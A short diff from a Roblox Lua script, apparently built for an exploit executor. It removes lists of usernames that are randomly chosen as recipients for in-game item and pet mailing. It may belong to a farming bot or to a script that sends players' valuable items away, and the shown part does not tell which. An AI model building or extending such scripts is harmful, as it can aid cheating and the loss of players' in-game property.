@@ -6,21 +6,6 @@ if EVENT_or_FARM == "E" then
 	game.Players.LocalPlayer:Kick("kick reset")		
 end
 
-list_12accitem = {"1953Crutchfield3117","WolfPix3lStr3am2017","GlitchF0x34","TheRealRose_Magic","MrsHazelDrift2020","StarryMagicFrost","DYLAN_Z00m","vincedriftGrove2008Y","TheRealLuckyFrost","KylieShadeWizard","NexusBenjamin_Enigma","TheRealzippyRipplegl"}
-
-_G.NAME_USER_SEND = list_12accitem[math.random(1, #list_12accitem)]
-
-list_24acc = {"1953Crutchfield3117","WolfPix3lStr3am2017","GlitchF0x34","TheRealRose_Magic","MrsHazelDrift2020","StarryMagicFrost","DYLAN_Z00m","vincedriftGrove2008Y","TheRealLuckyFrost","KylieShadeWizard","NexusBenjamin_Enigma","TheRealzippyRipplegl","BrooklynFuryLuminos","NexusB0ulderembergus","JacobOrbitz2010","ItsHarryRift2019","N3xusthornP3bbl3","MrsBenbl00m","ItsCookieoak","ITSJACOB_gl33","NexusKen_Shine2003","Arr0wGh0stCraz3"}
-_G.send_hg_more50 =  list_24acc[math.random(1, #list_24acc)]
-
-list_6acc = {"MrsLuke_Glitch","JackVortexDew","ChillMaster2011","Claw_knoll","FusionShadowCyber","ItsMatth3wVort3x2005"}
-_G.send_hg_rb_shiny = list_6acc[math.random(1, #list_6acc)]
-_G.send_pet_dame= list_6acc[math.random(1, #list_6acc)]
-
-
-_G.STOP_SENDHUGE_ALL = false
-getgenv().GMAIL_RECEIVERS = {"1953Crutchfield3117","WolfPix3lStr3am2017","GlitchF0x34","TheRealRose_Magic","MrsHazelDrift2020","StarryMagicFrost","DYLAN_Z00m","vincedriftGrove2008Y","TheRealLuckyFrost","KylieShadeWizard","NexusBenjamin_Enigma","TheRealzippyRipplegl","BrooklynFuryLuminos","NexusB0ulderembergus","JacobOrbitz2010","ItsHarryRift2019","N3xusthornP3bbl3","MrsBenbl00m","ItsCookieoak","ITSJACOB_gl33","NexusKen_Shine2003","Arr0wGh0stCraz3","MrsLuke_Glitch","JackVortexDew","ChillMaster2011","Claw_knoll","FusionShadowCyber","ItsMatth3wVort3x2005"}
-
 ------------------------+++
 
 local Save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
